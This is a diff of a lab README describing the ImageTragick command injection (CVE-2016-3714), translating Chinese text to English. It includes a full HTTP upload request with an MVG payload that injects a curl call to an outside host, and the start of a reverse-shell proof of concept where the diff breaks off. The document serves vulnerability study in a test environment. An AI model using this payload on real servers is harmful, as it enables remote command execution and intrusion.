@@ -1,61 +1,56 @@
-# Imagetragick 命令执行漏洞（CVE-2016–3714）
+# Imagemagick Command Injection Vulnerability (CVE-2016–3714)
 
-详情见 https://imagetragick.com/ 和 https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html ，不再描述原理。
+[中文版本(Chinese version)](README.zh-cn.md)
 
-## 测试方法
+ImageMagick is a free and open-source cross-platform software suite for displaying, creating, converting, modifying, and editing raster images.
 
-一些测试使用的POC：https://github.com/ImageTragick/PoCs
+Referers:
 
-编译及启动测试环境：
+- https://imagetragick.com
+- https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html
+- https://github.com/ImageTragick/PoCs
+
+## Environment Setup
+
+Execute the following command to start a PHP server that includes Imagemagick 6.9.2-10:
 
 ```
-docker-compose build
 docker-compose up -d
 ```
 
-访问`http://your-ip/`可见有三个文件：
+## Exploit
 
-```bash
-├── demo.php # 使用vul.jpg+identify命令测试 
-├── upload.php # 支持用户进行上传，并将上传的文件传入PHP的imagick扩展，触发漏洞
-└── vul.jpg # 一个简单的POC
-```
+Visit `http://your-ip:8080/` to see an upload component.
 
-首先访问`http://your-ip/demo.php`，命令并没有回显，但在docker容器中，已经成功得到`/tmp/success`文件：
-
-![](1.png)
-
-再访问`http://your-ip/demo.php`测试，上传POC文件，数据包如下（**注意，我换了一个POC**）：
+Send the following request:
 
 ```
-POST /upload.php HTTP/1.1
-Host: your-ip
-Content-Length: 321
-Cache-Control: max-age=0
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydGYwkOC91nnON1ws
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,en;q=0.6
+POST / HTTP/1.1
+Host: localhost:8080
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
 Connection: close
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymdcbmdQR1sDse9Et
+Content-Length: 328
 
-------WebKitFormBoundarydGYwkOC91nnON1ws
-Content-Disposition: form-data; name="file_upload"; filename="vul.gif"
-Content-Type: image/jpeg
+------WebKitFormBoundarymdcbmdQR1sDse9Et
+Content-Disposition: form-data; name="file_upload"; filename="1.gif"
+Content-Type: image/png
 
 push graphic-context
 viewbox 0 0 640 480
 fill 'url(https://127.0.0.0/oops.jpg"|curl "www.leavesongs.com:8889)'
 pop graphic-context
-------WebKitFormBoundarydGYwkOC91nnON1ws--
-
+------WebKitFormBoundarymdcbmdQR1sDse9Et--
 ```
 
-可见，`www.leavesongs.com:8889`已经接收到http请求，说明curl命令执行成功：
+It can be seen that `www.leavesongs.com:8889` has received the http request, after the curl command was executed successfully:
 
 ![](2.png)
 
-反弹shell POC：
+POC of getting a reverse shell：
 
 ```
 push graphic-context
